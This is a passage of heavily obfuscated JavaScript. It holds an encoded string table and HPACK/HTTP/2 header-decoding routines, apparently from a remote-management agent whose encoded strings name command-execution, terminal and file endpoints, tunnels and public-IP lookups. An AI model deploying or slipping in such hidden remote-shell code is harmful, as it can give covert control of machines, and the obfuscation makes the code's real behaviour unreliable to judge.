        'x2DLDenVBMzPz1zHBhvL',
        'y2yTChjVEhKT',
        'D3vyzMG',
        'vgDjwNy',
        'D0futeC',
        'Chnfqu8',
        'y3jLyxrLuhvIBgLJs2v5',
        'shbSsNK',
        'uxPQC0i',
        'CgLK',
        'DxbKyxrLlwnVBMzPz3vYyxrPB24',
        'zxLk',
        'q2XVC2LUzYbJB25Uzwn0Aw9Uigr1zsb0BYbTAxnZAw5NihjLCxvLC3rFAwq',
        'AvrUENC',
        'ENrpDue',
        'lcbZzxqGzhvWBgLJyxrLpxrYDwuGDg8GzM9Yy2uGy3jLyxrPB24',
        'CMvZAxPL',
        'yxzNtg9Hza',
        'x3bYB2nLC3nuzxjTAw5HBe1LC3nHz2u',
        'tM9PC2vFwfHFmJu1mtLFq2HHq2HHug9SEv9cteflrtjZ',
        'CMvXDwvZDgLUzYbXDwLJAYb0Dw5UzwWGzMfPBgvKoIa',
        'yLfuzg8',
        'Ahr0Chm6lY9Py2fUAgf6AxaUy29T',
        'u2zvsgq',
        'CMv0CNKTywz0zxi',
        'x3DHAxrxAw5KB3C',
        'AgzyuKC',
        'AxnFyxv0AgvUDgLJyxrLza',
        'zgLZA190B3rHBa',
        'q0fJuu0',
        'ruXLB24',
        'runeu0fFufvcteLdx0Tfwv9qru0',
        'zxHWAxjLC19HDa',
        'C2vUzfDPBMrVD1vWzgf0zq',
        'DhLWzq',
        'yMrLDuK',
        'C3rHCNrtzxnZAw9U',
        'Ahr0CdOVlZeYnY4WlJaUmtO',
        'AwrXBve',
        'z2v0',
        'Ec1Hz2vUDc12zxjZAw9U',
        'AKDjuwO',
        'nda0',
        'yxfYzxq',
        'l2fWAs9IyxnLAw5MBW',
        'l2fWAs90yxnRl2nYB24',
        'C2vJlxDLyNnVy2TLDc12zxjZAw9U',
        'q2XVDwrgBgfYzsbpCMLNAw4Gq2vYDgLMAwnHDgu',
        'Dhj1BMnHDgvKieHqqunligLUDgvNzxi',
        'se1OChm',
        'zxHWCMvZCY13CW',
        'ANbKDvG',
        'quDftLrFvKvsu0LptG',
        'DKDZrNu',
        'u1L3BuK',
        'Chv0',
        'BNvTyMvY',
        'yM9KEq',
        'x3jLy2vPDMvxC0j5DgvZ',
        'y3rns3O',
        'C29JA2v0',
        'D3D3lwf1DgHLBNrPy2f0zq',
        'u3LZDgvTmZi',
        'mNWZFdL8n3W2Fdr8nxWXFdb8oa',
        'y2XLyxi',
        't1vLshq',
        'wLDLA3q',
        'zgvSzxrLza',
        'EK1oCKO',
        'DhvUBMvSswq',
        't1z2sfm',
        'y29UDgvUDc1Syw5NDwfNzq',
        'u0HbmJu2',
        'lcbtAwDUywW6ia',
        'zgvSzxrLrg9TywLUrMLSzq',
        'v2LUzg93C1bVD2vYu2HLBgW',
        'wvPiENC',
        'sxriExK',
        'l2rLDI8',
        'qY5vveyToa',
        'vevnueTfwv9eruzbvuXux1rutf9it1vsuW',
        'Ahr0Chm6lY9PzMnVBMzPzY5Tzs9PCa',
        'suvcA3y',
        'ChjVBwLZzxm',
        'CM1KAxjtEw5J',
        'qLL0A0y',
        'BgLZDezPBgvZ',
        'wNrRD1O',
        'q0zTsgm',
        'qND5r1q',
        'AxnZDwvYie8GBwLZBwf0y2G6ia',
        'DgLpCKG',
        'B2ryvgq',
        'yNvMzMvY',
        'Ahjfwfa',
        'CMvHzgfIBgu',
        '8j+AGcdNU4JNQ6/OV5VNQiVLT7lLKk/LIQGGkfbjrdOG',
        'yNLfBuW',
        'ugfRC3q',
        'wfLPr3y',
        'uefKyK4',
        'zMfPBgvKihrVignYzwf0zsb0Dw5UzwW6ia',
        'r1fdwKi',
        'Ag1bvNm',
        'A2v5CW',
        'sKLLCeq',
        'DxnLza',
        'y2LWAgvY',
        'twLKzgXLD2fYzsbHChbSAwvKlcbZzxr0Aw5NihvWihjVDxrLCY4UlG',
        'wvj3DuK',
        'uNzkEfy',
        'yvfHCgq',
        'z1D3DK4',
        'BNnAyum',
        'zwrNzsbKAwqGBM90ihnLBMqGDgHLieHuvfaVmIbJBgLLBNqGChjLzMfJzq',
        'wxDMDfm',
        'z2v0qxzHAwXHyMXLu2HLBgW',
        'svzet24',
        'C3Lpyvm',
        's1jAzvu',
        'Ahr0Chm6lY9HCgK2lMLWAwz5lM9YzW',
        'AxnjBML0Awf0B3i',
        'uNjAuei',
        'y3jLyxrLzef0',
        'Ec1HDxrOlxrVA2vU',
        'wLf2swG',
        'C3rYzwfTv2LUzg93CW',
        'u3bSAxq',
        'DxbKyxrLq29UzMLN',
        'zMnbzhG',
        'y3vYCMvUDeXVywq',
        'tKvgvem',
        'te9hx0XfvKvm',
        'Bwf4lwzVCNDHCMrZ',
        'y3j5ChrV',
        'w0Tnt0rfxsdWN5Er77IpiowFN+wqJEAwH+s7TUw3SUwiOoMzPdOG',
        'B0TLzLa',
        'Aw52ywXPzcbXDwLJAYb0Dw5UzwWGCMvZCg9UC2u6ia',
        'BxnNuxvLDwu',
        'AMDfvwG',
        'qwnJzxnZlunVBNrYB2WTrxHWB3nLluHLywrLCNm',
        'C29JAW',
        'l2fWAs9LEgvJ',
        'runkEKy',
        'sfbbq0SGzhLUyw1PyYbPBMrLEcbVDxqGB2yGCMfUz2u',
        'D2vIC29JA2v0ihn0CMvHBsa',
        'rKfnBvm',
        'q1fzsK4',
        'C1Lyuu0',
        'BgfZDe5LDhDVCMTuAw1L',
        'zMXVB3i',
        'u3LZDgvTsw5MB0nVBgXLy3rVCIbPBML0AwfSAxPLza',
        'ywn0AxzHDgu',
        'vgrwAwC',
        'r2nhqu8',
        'Bhrky3i',
        'y2XVC2u',
        'l2fWAs90yxnRl29UzxrPBwu',
        'DKHAyM8',
        'tLjxt0O',
        'rMLSzsb1CgXVywrLzcbZDwnJzxnZzNvSBhKU',
        'BxvSDgKTC2vNBwvUDcbdyxaNBIbqCM90BYbTzxnZywDLigLZig5VDcbZDxbWB3j0zwq',
        'DNPAvM4',
        'l2fWAs93CY8Q',
        'r01ztvm',
        'x25VDgLMEvDPBMrVD3m',
        'txjvtvy',
        'Ec1MAwXLlxnPEMu',
        'y3jLyxrLsw50zxjMywnL',
        's1jszMe',
        'uwH6sgq',
        'y29UDgfPBMvYpwX4yW',
        'CgvLCK1HEezYyw1L',
        'DhjHBNnMzxiTzw5JB2rPBMC',
        'tK9ju0vFqunusu9ox1jfqurFtuvtu0fhrq',
        'vxP3vNC',
        'zxjYB3jZ',
        'C3rYAw5NAwz5',
        'q2H1BMSG',
        'y29UBMvJDgvKihrVia',
        'C3DHCf90B3rHBa',
        'mJyWotCYmertDLfZuG',
        'u0vtu0LptL9lrvK',
        's3n5Ava',
        'ChjPDMf0zq',
        'vefts19usu1ft1vu',
        'BgvUz3rO',
        's1bbveG',
        'DxbSB2fKrMLSzvjHDW',
        'vevTqKS',
        'qMPcvM0',
        'DhvUBMvSigfSCMvHzhKGzxHPC3rZig9UihbVCNqG',
        'ENfYrha',
        'ywXWBLbYB3rVy29S',
        'zwnPzxnQCW',
        'EuTPDxa',
        'oNbHDgG',
        's3rPwfu',
        'BxvSDgLWBguGDhvUBMvSCYbLEgLZDcbVBIbWB3j0ia',
        'tLnfy00',
        'u2jYqKe',
        'y2zIBM8',
        'BKPnCui',
        'whDPDKS',
        'yLnYr0K',
        'ChjPDMf0zv9InJq',
        'D0D3zu4',
        'sMnmBgW',
        've1Ot0K',
        'y29Uy2f0',
        'v1HYB2W',
        'Efj0D2q',
        'C3DHChrVDgfS',
        'zhLUyw1Py1nPEMu',
        'DxjS',
        'ruvfr3a',
        'Cg5eBgq',
        'uc0Ynty',
        'y3jLyxrLsgfZAa',
        'zgvSzxrL',
        'zNjVBuj5DgvbCNjHEq',
        'qKn0uvy',
        'l2fWAs90zw1WA2v5',
        'mc40lJKTANm',
        'mZyWma',
        '4PQG77Ipievdrfnb5ywS6zkL5yQG6l295AsX6lsLoIa',
        'vu90zfu',
        'Eg1sB1y',
        'ANfNqLe',
        'zKHAruG',
        'te9Jqw4',
        'Cvb5A3i',
        'shv5DvC',
        'DhvUBMvSrg9TywLU',
        't0TPww8',
        'sw5PDfrHC2S',
        'xsdWN5QOioIUPoIVGEwKSEI0PE+8JoMDNUAZLsbuB2TLBU+8Gq',
        'BgfZDeLUzgv4t2y',
        'Aw50zxjUywW',
        'x2jHC2vPBMzVx2zLDgnOx3bYB21PC2u',
        'BMv0D29YA1n0yxrZ',
        'AgfUzhnOywTLrMLUAxnOzwq',
        's01preu',
        'yNDpBKG',
        'x3j1BLrLCM1PBMfS',
        't2fit0K',
        'tNfpwgO',
        'DhvUBMvSu3rHDgu',
        '8j+uHcbBvgvTCeTLEv0G5lI05PE25A+g6zkL5BEY6l+h5PYFoIbRzxLFAwq9',
        'zxHWAxjLCW',
        'sxzVs2S',
        'DxjSzw5JB2rLza',
        'EYjZCMmIoIjVCMLNAw4IlcjMBg93x3jHDgvFBgLTAxrLzci6zMfSC2v9',
        'AwyTBwf0y2G',
        'EfDhru0',
        'DgvZDa',
        'rwPZANi',
        'Ag9ZDa',
        'B25cyxnLAw5MB1n1y2nLC3m',
        'Dgv4Dc9WBgfPBG',
        'zwnPzxnqDwjRzxK',
        'DuPjCKC',
        'lY5KB2nRzxjLBNy',
        'CuHLC2u',
        'zff0t3q',
        'B0rKAum',
        'DgLTzw91Da',
        'y2HPBgrFChjVy2vZCW',
        'l3n5CY9MCY9Jz3jVDxaVBwvTB3j5l21LBw9YEs51C2fNzv9PBL9IExrLCW',
        'zxHLy3v0zq',
        'u3rHCNrPBMCGsfruucbZzxj2zxiUlI4',
        'sezOEKC',
        '8j+sPsdLKk/LIQJNU4JNQ6/LPlhOTku6ia',
        'rvrmtfi',
        'CMvXDwvZDa',
        'x2LZrxHWAxjLza',
        'Dgv4Dc9ODg1SoYbJAgfYC2v0pxv0zI04',
        'BeLfA1K',
        'uLzkzfy',
        'Bg9Hza',
        'ywjZ',
        'u2v0DgLUzYb1CcbxzwjtB2nRzxqGDgvYBwLUywWGCM91DguUlI4',
        'yxbWBhK',
        'mJaYnc4Xmc4Wlu5LEhvZ',
        'qwnJzxnZlunVBNrYB2WTqwXSB3CTtwv0Ag9KCW',
        'Cgf0Aa',
        'rxbpuxu',
        'iowKSEI0PtOG',
        'qwnJzxnZlunVBNrYB2WTqwXSB3CTt3jPz2LU',
        'Cxb6D20',
        'uNLlEhu',
        's1jLCvm',
        'y29UC3rHBNrZ',
        'DgDvDNq',
        'ue9sva',
        'DxbSB2fKrMLSzq',
        'DhvUBMvSCW',
        'zw5JCNLWDfjLC3bVBNnL',
        'r1DvCgq',
        'ufPjtLu',
        'Dg9cExrLCW',
        'vxPZtLi',
        'y29VA2LL',
        'Cgf0Ag5HBwu',
        'DMPjquO',
        'ChvIBgLJx2i2na',
        '5O+H5OMl5PYQ5A6m5OIq77Ym5PEG5Rov6kEJ5A+g5PwW5O2U',
        'mZaW',
        'z3bmzMC',
        'l2fWAs9MAwXLl25LDW',
        'g1SZnM1Bsu5gt10BwZbTia',
        'DNrftwS',
        'CMjPqMm',
        'vvzKs1a',
        'x2DLDerPC2TjBMzV',
        'uuvnvq',
        'zwnKC2fqDwjRzxK',
        'txzICu0',
        'ndvzBgHpzw0',
        'BNnwAgS',
        'uNrPBwvVDxq',
        'ywnJzxnZx2rLBMLLza',
        'rwToDg8',
        'C3LZDgvTAw5MB3jTyxrPB24',
        'q29UDgvUDc1mzw5NDgG',
        'uKHMEhK',
        'sNPqCui',
        'sNrKDfu',
        'AunOt3K',
        'qvDrBhm',
        'CMvHzezPBgvtEw5J',
        'u0DpA0u',
        'rvHfq19tsevmtf9nt0rf',
        'twLZC2LUzYbYzxf1AxjLzcbJDxn0B20GAgvHzgvYCZOGwc1gAwXLlvbHDgGGyw5KifGTrMLSzs1oyw1L',
        'Dg90ywXozxr3B3jRvxa',
        'DgLTAw5Nu2fMzuvXDwfS',
        'sLH6tMC',
        'ugf0AcbUB3qGzM91BMq',
        'z2v0q3jVBKXVz3m',
        'CxvPy2SGDhvUBMvSihjLDhvYBMvKig5VBI1ku09oicG',
        'y3jLyxrLv3jPDgvtDhjLyw0',
        'DxrMoa',
        'C2HVCNqGq2fWj24GuhjVDg8GCMv0DxjU',
        'tevwruXt',
        'Dw5JyxvNAhrfEgnLChrPB24',
        'Axb2na',
        'wgzdsgq',
        'zMvLza',
        'z3b1x25HBwu',
        'x25LEhq',
        'CMvHzgrPCLn5BMm',
        'yw1It1O',
        's2zKAMK',
        'u05OtKC',
        'v19psW',
        'C3rYAw5N',
        'CMvWzwf0',
        'yxj1zM8',
        'CMvWBgfJzq',
        'rK9mte9xx1nztuXjtKTt',
        'Ahr0Chm6lY9TEwv4DgvYBMfSAxaUy29Tl3jHDW',
        'r09Ts1u',
        'BuvNqNG',
        '4P2miowqR+wkQoEgLoAwRtOGruneu0eG5ywS6zkL57Y65AsX5OIw6kEJ5P6q5AsX6lsL77Ym6z2EierfqLvhioAOOEw8J+s4I+AlKUE7NEwqR+wkQa',
        'zxHPDgnVzgu',
        'Du9Nt1C',
        'mZa1nZKWnMrwCLPXwa',
        'z2vUzxjHDgvlzxLqywLYu3LUyW',
        'y3n2rKK',
        'C1H1yuy',
        'AM9hzvK',
        'zwXIr28',
        'rNrUzKu',
        'zwnPzxnFChvI',
        'seT1qM4',
        'y2vPBa',
        'vhjoywi',
        'tLHorwG',
        'zwnPzxnFChjPDMf0zv9RzxK',
        'A3fNwxu',
        'BMv0D29YAW',
        'yxbWBgLJyxrPB24VEg1S',
        'z2v0q3jVBLrHC2TZ',
        'Cg1UCNe',
        'DMvYC2LVBG',
        'Agzlvuu',
        'BM9PC2uTyY53yxnT',
        'rwXyvva',
        'z1LcEgO',
        'CMfT',
        'zxHPC3rZu3LUyW',
        'u2P6uey',
        'vgDUD0O',
        'Bvzbufq',
        'sfblEvm',
        'mNWWFdn8nhWX',
        'mNW0Fdf8m3WW',
        'Ahr0Chm6lY9HCgKUDhj5y2XVDwrMBgfYzs5JB20',
        'x3DHA2u',
        'ru5svwS',
        'y2LWAgvYDgv4Da',
        'BgLZDa',
        's0nnuhG',
        'BhLQvuG',
        'BMPbu3e',
        'xsdMIAFOOyZNU4JNQ6/OTytMUPdMUixNKiyUlI4',
        'q1P3DKW',
        'ic0+ideYnY4WlJaUmtO',
        'q2XLyw5SEsbJBg9Zzwq',
        'sg9ZDdOG',
        'AxnwywXPzeLqDJy',
        'suPkvfG',
        'C25bCuS',
        'vuXoCMu',
        'DfPcCNG',
        'qKrOBfG',
        'sLjVDeW',
        'r2v0uMvTB3rLuhvIBgLJs2v5',
        'zMLSzw5HBwu',
        'wwT5qNa',
        'ALnMBgS',
        'tuHnruS',
        '4PQG77IpienVBLbuwsdLKk/LIQJLPlhOTkxVViZLM57PGidNRQhPGzpMQkhLVi86ia',
        'runeu0eGChvIBgLJigTLEsbUB3qGBg9HzgvK',
        'wezgDeq',
        'yuHhvxK',
        'ChjPBwuYntz2mq',
        'y3b1x2nVCMvZ',
        'CwvzvxC',
        'sgHHENe',
        '8j+uHcbBq2fJAgvDiejHC2vjBMzVioE8K+wTMow3SUI/H+ACN++8Jow3SUMhJEAwSoIWG+w6PUEZU+E7N+I1HoA6KoI/M+IHJoABToAwSooaGG',
        'yNvUlxb0Eq',
        'teL1vK4',
        'z2v0t3jdCMvHDgu',
        'BfLXvgC',
        'BhHJ',
        'w0Tnt0rfxsdWN5QaieTnt0rfpti6ioMAP+MbK+wFN+wqJEwWHUs4IUAkPEIhS+wKLUMdQow5S+wpSa',
        'tNf5q0W',
        'lcbZCgvJAwz5ihr1BM5LBf9KB21HAw4GDg8GzgLZyw1IAwD1yxrL',
        'Edi1nte5',
        'vxzmzKu',
        'BNbLDxq',
        'x2vTAxreyxrH',
        'sNnMtLy',
        'Ahr0Chm6',
        'rKTxy2u',
        'qwHHCgS',
        '8j+sPsbBqM9KEsbqyxjZzsbfCNjVCL06ia',
        'vgXuEfi',
        'BwfSzM9YBwvKieHuvfaVms4XihjLC3bVBNnLihn0yxr1CW',
        'y3HHuve',
        'AgfUzhnOywTL',
        'zMv0y2Hjua',
        'BwDXs3G',
        'Aw52ywXPzcbivfrqlZiGCgfKzgLUzW',
        'A2XRywK',
        't1fPrwu',
        'ufnNy08',
        'ufvTCLq',
        '8j+uHcbBu0vdvvjjvfLDios4ToAxTUwVHUMsPEI/H+ACNYWG5BEY6l2U5O2Iifnfu1njt05Fs0vzios4JUAoP+wiTUERRYboB2LZzsdLR4BPKQxLR7KGkowqIoAZLEAoP+wiTUERR+MCGoMhJEAwSoIUPoIVGEIoT+wpLIbIyxnLAw5MBYdMLRdLR4BPKQuP',
        'CgfYC2u',
        'x2rVtM9PC2viyw5KC2HHA2u',
        'zxjYB3jLza',
        'C2HPzNq',
        'C2vJDxjLq29UBMvJDa',
        'sevbra',
        'BgLZDgvU',
        'sgfUzhnOywTLu3rHDgu',
        'EKjVD2e',
        'y29UBMvJDgLVBG',
        'Ahr0Chm6lY92nI5PzgvUDc5Tzq',
        'tNvuv3q',
        'A25HBwvwywXPza',
        'ChjVEhKTyxv0AgvUDgLJyxrL',
        'zK1yrw8',
        'CeTgqMi',
        'B25LDgLTzxrHC2TZx2XVzW',
        'zgvIDwC',
        'BMv0D29YA0LUDgvYzMfJzxm',
        'l2fWAs9MAwXLl2f1DgHVCML0Eq',
        'uw5oqui',
        'C3rYzwfTswq',
        'zNz0z0G',
        'x2DLBMvYyxrL',
        'z2nQDeG',
        'DhvUBMvSvxjS',
        'x3n0yxr1C19JywnOzq',
        't0T6tNe',
        'y3jLyxrLzf9HDa',
        'ChjVy2vZC0HHBMrZAgfRzq',
        'Dejzrem',
        'v2vIu29JA2v0ignVBM5Ly3rPB24Gyxr0zw1WDcb3AxrOihjLCxvLC3rFAwq6ia',
        'jeHptuu',
        'mc4WlJaUma',
        'EhrSsgS',
        'yLDuy1i',
        'Cuv4DfO',
        'rgPqr24',
        'Ahr0Chm6lY9PCgLUzM8UAw8VAxa',
        'y2H1BMTF',
        'DgvYBwLUywW',
        'EhvKt1e',
        'l2fWAs90yxnRl2XVzY9ZDw1Tyxj5',
        'sfnZseW',
        'DgHLBG',
        'sxbvwK8',
        'Dgv4Dc9JC3m7ignOyxjZzxq9DxrMltG',
        'rwD5Cwm',
        'D1fRCMm',
        'tLnJzKe',
        'ChjVyW',
        'ywXS',
        'qKPQz1i',
        'x2HHBMrSzvjHD01LC3nHz2u',
        'DhDxAgm',
        'ufjjicOGsfruuc8YlJancG0ku00ncG0k',
        'A1DoqxO',
        'C3bSAxq',
        'CgHHC2u',
        'zxHWB3j0',
        'C3vIAMvJDcbdtIbTAxnTyxrJAa',
        'rKDWvve',
        'y2f0y2G',
        'ELHyEe0',
        'wf9psW',
        'A1DbAvu',
        '4P2mioE7IoERR+s8MUIVNEw8GUw4UdOG',
        'C2v0vgLTzw91Da',
        'q1rWEKW',
        'BK9WteW',
        'm25ttxbKzG',
        'wwzYAMq',
        'C2HLBgW',
        'DhvUBMvSihjLz2LZDhjHDgLVBIbMywLSzwq6ia',
        'D3jPDgfIBgu',
        'qxjArve',
        'Ehb4shm',
        'BM9UDeq',
        'zMLSDgvY',
        'vxLOrfC',
        'vw5ZDxbWB3j0zwqGCgvYBwLZC2LVBIbMB3jTyxqSig9UBhKGB2n0ywWGC3rYAw5NCYbHCMuGC3vWCg9YDgvK',
        'Buzjtg4',
        'uxvWruq',
        'Dg9tDhjPBMC',
        'yxbWBgLJyxrPB24VANnVBG',
        'DwLK',
        'y3jLyxrLrgLYzwn0B3j5',
        'zgLZAW',
        'C2vZC2LVBL9RzxK',
        'CLroBxu',
        'y3DvBvu',
        'svDnrha',
        'zgvJCNLWDerHDge',
        'wMLguLu',
        'zevNsLq',
        'EvrQy3O',
        'CgTJCZG',
        'q2XVDwrgBgfYzsbpCMLNAw4Gu1nm',
        'C0Hfuwu',
        'zxHPDa',
        'A0fmzLa',
        'vM9Qv0m',
        'vfHdvhq',
        'twvUCxK',
        'EKLbBLy',
        'icaGms4G6k6+572U546V5Akd5y+y6yEpoIbLEhbVCNqGruneu0fFufvcs0vzpsCTls0Tlujfr0LoifbvqKXjqYblrvKTls0TlsCUlI4N',
        'B05vz3q',
        'Aw5MBW',
        'q1nYCeK',
        'y29UBMvJDgLVBLDPBMrVDW',
        'Bwf4u2L6zq',
        'Cvvpt3C',
        'z2v0tg9JywXjuhy2',
        'vhflyKO',
        'x2rVBwfPBG',
        'AwyTDw5TB2rPzMLLzc1ZAw5Jzq',
        'wM1VBLK',
        'CxvPy2SGDhvUBMvSihjLCxvLC3qGD2fZihjLAMvJDgvKoIa',
        's3v5uLG',
        'sxD5vgS',
        'Ec1MAwXLlxbHDgG',
        'rxHWCMvZCYbHChaGy3jLyxrLzcbHBMqGzxHWCMvZC1DZigfWCgXPzwq',
        'BxDLALO',
        'r2fJrfy',
        'quvtierLy3j5ChqGrxjYB3i6ia',
        'C3rHCNq',
        'zhDWCxq',
        'DhvUBMvSx2rVBwfPBG',
        'suTVBuG',
        'qMrMEhO',
        'BwfPBG',
        'qNfQrxm',
        'y3jVBNrHC2TZx2XVzW',
        'AM9PBG',
        'nNWZFdv8nhWWFdf8mG',
        'uNnQs3a',
        'DLHlr3u',
        'sM5fueK',
        'z2v0qwn0AxzLrwnKC2fwAW',
        'r2XNww4',
        'C2PXufC',
        'l2LUzgv4lMH0BwW',
        'l2jPBI9IyxnO',
        'uuvXtum',
        'l2jPBI9ZAa',
        '8j+uHcbBq2fJAgvDifn0yxr1CYdLRP7ML7BNM5hMJQFNVjpLRzJLT7lOV4FMNj/VViZLT7lPH43MLRdNLj/MIjdLUQBPH4/LV6VNHAFJGii',
        'zNjVBq',
        's0HWzwW',
        'CMvXDwvZDezPBMLZAgvK',
        'DgfIBgvfBNrYEq',
        'CgLWzq',
        'CM1tEw5J',
        'qLPPBKe',
        'Dg90ywXozxr3B3jRrg93BG',
        'g1SZmw1BrKfuquWGrvjst1jDg1SWBsdOR6BNU4BPLjNOR686ia',
        'y3vYCMvUDeXLDMvS',
        'DMfYEq',
        'iowWJ+AxTG',
        'y2z0Dw5UzwWUANmVms4W',
        'Dgv4Da',
        'CMvHzgXPBMu'
    ];
    a0a = function () {
        return fJ;
    };
    return a0a();
}
function a0a9(a) {
    const cv = a0aQ, b = {
            'DlwPh': function (h, i) {
                return h >= i;
            },
            'sHEQe': function (h, i) {
                return h >> i;
            },
            'vHZbo': function (h, i) {
                return h | i;
            },
            'Ahapk': function (h, i) {
                return h << i;
            },
            'ZiFRU': function (h, i) {
                return h === i;
            },
            'LXICY': 'invalid\x20HPACK\x20Huffman\x20string',
            'JyPkI': cv(0x150),
            'yXABN': cv(0x3d2),
            'OHWZx': function (h, i) {
                return h > i;
            },
            'GVAKs': 'invalid\x20HPACK\x20Huffman\x20padding'
        }, c = [];
    let d = a0a8, f = 0x0, g = 0x0;
    for (const h of a) {
        for (let i = 0x7; b[cv(0x442)](i, 0x0); i--) {
            const j = b[cv(0x6bf)](h, i) & 0x1;
            f = b[cv(0x52f)](b[cv(0x64f)](f, 0x1), j), g += 0x1, d = d[j];
            if (b[cv(0x6ba)](d, null))
                throw new Error(b[cv(0x1b7)]);
            if (d[0x2] >= 0x0) {
                const k = b['JyPkI'][cv(0x696)]('|');
                let l = 0x0;
                while (!![]) {
                    switch (k[l++]) {
                    case '0':
                        if (b['ZiFRU'](d[0x2], 0x100))
                            throw new Error(b['yXABN']);
                        continue;
                    case '1':
                        g = 0x0;
                        continue;
                    case '2':
                        c[cv(0x385)](d[0x2]);
                        continue;
                    case '3':
                        f = 0x0;
                        continue;
                    case '4':
                        d = a0a8;
                        continue;
                    }
                    break;
                }
            }
        }
    }
    if (b['OHWZx'](g, 0x7) || f !== (0x1 << g) - 0x1)
        throw new Error(b[cv(0x715)]);
    return Buffer[cv(0x6ef)](c);
}
function a0aa(a, b, c) {
    const cw = a0aQ, d = {
            'hfKUE': function (j, k) {
                return j >= k;
            },
            'nEUDS': function (j, k) {
                return j - k;
            },
            'aCmDc': function (j, k) {
                return j << k;
            },
            'AsFKp': function (j, k) {
                return j & k;
            },
            'mlzJV': function (j, k) {
                return j < k;
            },
            'gazKA': function (j, k) {
                return j & k;
            },
            'FeKzJ': cw(0x236)
        };
    if (d[cw(0x612)](b, a['length']))
        throw new Error(cw(0x4c1));
    const f = a[b];
    b += 0x1;
    const g = d[cw(0x28d)](d[cw(0x2ae)](0x1, c), 0x1);
    let h = d[cw(0x73d)](f, g);
    if (d[cw(0x130)](h, g))
        return [
            h,
            b
        ];
    let i = 0x0;
    while (!![]) {
        if (b >= a['length'])
            throw new Error(cw(0x4c1));
        const j = a[b];
        b += 0x1, h += d['AsFKp'](j, 0x7f) * Math['pow'](0x2, i);
        if (d['gazKA'](j, 0x80) === 0x0)
            return [
                h,
                b
            ];
        i += 0x7;
        if (i > 0x1c)
            throw new Error(d[cw(0x3fb)]);
    }
}
function a0ab(a, b) {
    const cx = a0aQ, c = {
            'sjqPW': cx(0x40c),
            'mVvUi': function (j, k) {
                return j & k;
            },
            'qHese': function (j, k, l, m) {
                return j(k, l, m);
            },
            'lGyTx': function (j, k) {
                return j + k;
            },
            'WWglT': 'truncated\x20HPACK\x20string\x20data',
            'VtVdS': function (j, k) {
                return j(k);
            }
        };
    if (b >= a[cx(0x54b)])
        throw new Error(c[cx(0x6e9)]);
    const d = Boolean(c['mVvUi'](a[b], 0x80)), [f, g] = c[cx(0x598)](a0aa, a, b, 0x7), h = c['lGyTx'](g, f);
    if (h > a[cx(0x54b)])
        throw new Error(c['WWglT']);
    const i = a[cx(0x74f)](g, h);
    return [
        d ? c[cx(0x302)](a0a9, i) : i,
        h
    ];
}
class a0ac {
    constructor() {
        const cy = a0aQ;
        this[cy(0x11e)] = [], this[cy(0x566)] = 0x0, this[cy(0x6cb)] = 0x1000;
    }
    [a0aQ(0x6f2)](a) {
        const cz = a0aQ, b = {
                'mOxgY': cz(0x773),
                'KUELU': function (d, f) {
                    return d <= f;
                },
                'kRLSq': function (d, f) {
                    return d - f;
                },
                'gPHlM': function (d, f) {
                    return d - f;
                },
                'WhPkd': function (d, f) {
                    return d < f;
                },
                'xdSSE': function (d, f) {
                    return d >= f;
                },
                'kQCmI': cz(0x521)
            };
        if (a <= 0x0)
            throw new Error(b[cz(0x431)]);
        if (b[cz(0x290)](a, a0a4[cz(0x54b)]))
            return a0a4[b[cz(0x38f)](a, 0x1)];
        const c = b['gPHlM'](a, a0a4[cz(0x54b)]) - 0x1;
        if (b[cz(0x17f)](c, 0x0) || b[cz(0x191)](c, this[cz(0x11e)][cz(0x54b)]))
            throw new Error(b['kQCmI']);
        return this[cz(0x11e)][c];
    }
    ['add'](a, b) {
        const cA = a0aQ, c = {
                'CkDyl': function (f, g) {
                    return f + g;
                },
                'ECJzF': function (f, g) {
                    return f + g;
                },
                'gYBxj': cA(0x5e6),
                'Ejsjr': function (f, g) {
                    return f > g;
                },
                'yrMjZ': function (f, g) {
                    return f > g;
                },
                'xhgke': function (f, g) {
                    return f > g;
                },
                'gixhu': function (f, g) {
                    return f + g;
                }
            }, d = c[cA(0x3bc)](c[cA(0x520)](0x20, Buffer[cA(0x2a2)](a, c[cA(0x615)])), Buffer[cA(0x2a2)](b, c[cA(0x615)]));
        if (c[cA(0x591)](d, this['maxSize'])) {
            this[cA(0x11e)] = [], this[cA(0x566)] = 0x0;
            return;
        }
        while (c[cA(0x277)](this[cA(0x11e)]['length'], 0x0) && c[cA(0x1ca)](this[cA(0x566)] + d, this[cA(0x6cb)])) {
            const [f, g] = this[cA(0x11e)][cA(0x3da)]();
            this[cA(0x566)] -= c[cA(0x426)](c['ECJzF'](0x20, Buffer[cA(0x2a2)](f, c[cA(0x615)])), Buffer[cA(0x2a2)](g, c[cA(0x615)]));
        }
        this[cA(0x11e)][cA(0x157)]([
            a,
            b
        ]), this[cA(0x566)] += d;
    }
    ['decode'](a) {
        const cB = a0aQ, b = {
                'AIxpX': function (f, g) {
                    return f < g;
                },
                'lGzge': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'MpxmL': function (f, g) {
                    return f & g;
                },
                'pHMJc': cB(0x5e6),
                'FMdsV': function (f, g, h) {
                    return f(g, h);
                },
                'tkRis': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'WQJki': function (f, g) {
                    return f > g;
                },
                'UOtdU': cB(0x753),
                'ymuTl': function (f, g) {
                    return f > g;
                },
                'IEBkv': function (f, g) {
                    return f + g;
                },
                'qJXrb': function (f, g) {
                    return f + g;
                }
            }, c = [];
        let d = 0x0;
        while (b[cB(0x22e)](d, a[cB(0x54b)])) {
            const f = a[d];
            if (f & 0x80) {
                let j;
                [j, d] = b[cB(0x6fe)](a0aa, a, d, 0x7), c[cB(0x385)](this[cB(0x6f2)](j));
                continue;
            }
            if (b[cB(0x2fb)](f, 0x40)) {
                let k, l;
                [k, d] = b['lGzge'](a0aa, a, d, 0x6);
                if (k)
                    l = this['tableEntry'](k)[0x0];
                else {
                    let o;
                    [o, d] = a0ab(a, d), l = o[cB(0x6b0)](b['pHMJc'])[cB(0x44e)]();
                }
                let m;
                [m, d] = b[cB(0x701)](a0ab, a, d);
                const n = m[cB(0x6b0)](b['pHMJc']);
                this[cB(0x465)](l, n), c[cB(0x385)]([
                    l,
                    n
                ]);
                continue;
            }
            if (b['MpxmL'](f, 0x20)) {
                let p;
                [p, d] = b[cB(0x15c)](a0aa, a, d, 0x5);
                if (b[cB(0x2a9)](p, 0x1000))
                    throw new Error(b[cB(0x573)]);
                this[cB(0x6cb)] = p;
                while (b['WQJki'](this[cB(0x11e)][cB(0x54b)], 0x0) && b[cB(0x3ab)](this['dynamicSize'], p)) {
